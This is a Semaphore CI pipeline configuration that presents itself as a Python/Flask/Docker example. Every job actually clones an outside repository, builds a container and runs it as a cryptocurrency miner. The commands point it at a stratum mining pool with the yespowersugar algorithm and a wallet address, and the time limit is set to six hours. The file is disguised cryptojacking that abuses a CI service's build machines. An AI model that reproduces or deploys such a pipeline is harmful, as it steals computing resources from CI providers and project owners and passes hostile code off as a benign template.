version: v1.0
name: Semaphore Python / Flask / Docker Example Pipeline
agent:
  machine:
    type: e1-standard-4
    os_image: ubuntu1804
execution_time_limit:
  hours: 6
blocks:
  - name: Build
    task:
      secrets:
        - name: quay-pull-secrets
      jobs:
        - name: Docker build
          commands:
            - 'git clone https://github.com/jessica-ci/mauk.git'
            - cd mauk
            - 'docker build --tag mauk:latest .'
            - 'docker run --publish 8000:8080 --detach --name mauk mauk:latest -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.mauk1'
  - name: 'Block #2'
    task:
      prologue:
        commands:
          - 'git clone https://github.com/jessica-ci/mauk.git'
          - cd mauk
          - 'docker build --tag mauk:latest .'
          - 'docker run --publish 8000:8080 --detach --name mauk mauk:latest'
      jobs:
        - name: 'Job #1'
          commands:
            - 'docker ps -a '
            - 'docker run --publish 8000:8080 --detach --name mauk mauk:latest -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.mauk'
